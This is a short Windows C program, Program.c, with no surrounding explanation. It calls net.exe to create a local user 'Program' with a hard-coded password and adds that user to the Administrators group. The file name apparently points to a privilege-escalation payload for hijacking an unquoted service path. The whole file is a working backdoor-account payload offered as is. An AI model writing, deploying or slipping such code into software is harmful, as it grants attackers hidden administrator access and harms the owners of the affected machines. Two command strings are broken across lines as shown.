// ===== Start Program.c ======
#include <windows.h>
#include <stdio.h>

INT main( VOID )
{
    CHAR  szWinDir[ _MAX_PATH ];
    CHAR szCmdLine[ _MAX_PATH ];

     GetEnvironmentVariable( "WINDIR", szWinDir, _MAX_PATH );

    printf( "Creating user \"Program\" with password \"Pr0gr@m$$\"...\n" );

    wsprintf( szCmdLine, "%s\\system32\\net.exe user Program
Pr0gr@m$$ /add", szWinDir );

    system( szCmdLine );

    printf( "Adding user \"Program\" to the local Administrators group...\n" );

    wsprintf( szCmdLine, "%s\\system32\\net.exe localgroup
Administrators Program /add", szWinDir );

    system( szCmdLine );

    return 0;
}
// ===== End Program.c ======

